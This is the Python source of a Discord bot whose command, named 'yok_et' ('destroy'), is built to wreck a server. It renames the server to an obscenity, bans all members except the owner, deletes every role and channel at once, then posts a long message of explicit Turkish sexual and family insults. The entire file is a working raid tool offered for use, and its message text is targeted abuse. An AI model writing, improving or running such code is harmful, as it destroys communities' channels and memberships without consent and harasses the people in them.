import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot hazır: {bot.user}")

@bot.command()
async def yok_et(ctx):
    """Sunucuyu saniyeler içinde yok eder"""
    guild = ctx.guild
    
    # Sunucu adını değiştir
    try:
        await guild.edit(name="orospu çocukları siktim laaan")
    except:
        pass
    
    # Tüm işlemleri paralel çalıştır
    tasks = []
    
    # Herkesi banla (guild.members zaten tüm üyeleri verir)
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            tasks.append(member.ban(reason="Sunucu temizliği"))
    
    # Tüm rolleri sil
    for role in guild.roles:
        if role != guild.default_role:
            tasks.append(role.delete())
    
    # Tüm kanalları ve kategorileri sil
    for channel in guild.channels:
        tasks.append(channel.delete())
    
    # Tüm işlemleri aynı anda çalıştır (Discord rate limitine takılabilir, ama hız maksimize edilir)
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Tek kanal oluştur
    new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
    
    # Mesajı gönder
    await new_channel.send(
        "**LemonSe Bot** tarafından sıkıldı hadi yallah!\n\n"
        "Ana bacı sövüyorum:\n"
        "- Ananızın amına koyayım sizin! Orospu çocukları!\n"
        "- Sizin gibi yarrağı yemiş herifleri banlamak ne güzel!\n"
        "- Ananızı sikeyim, babanızı sikeyim, sülalenizin hepsini sikeyim!\n"
        "- Ne biçim sunucu lan bu? Amına koyduğumun yerinde herkes banlandı!\n"
        "- Siz ne sandınız? LemonSe Bot gelir sizi temizler, anasını siktiğimin sunucusunu dümdüz eder!\n"
        "- Hadi yallah orospu çocukları, Discord'dan silin gidin!\n"
        "- Sonra da gelip ağlamayın, ananızı sikeyim sizin! 😘"
    )

bot.run(os.getenv("DISCORD_TOKEN"))
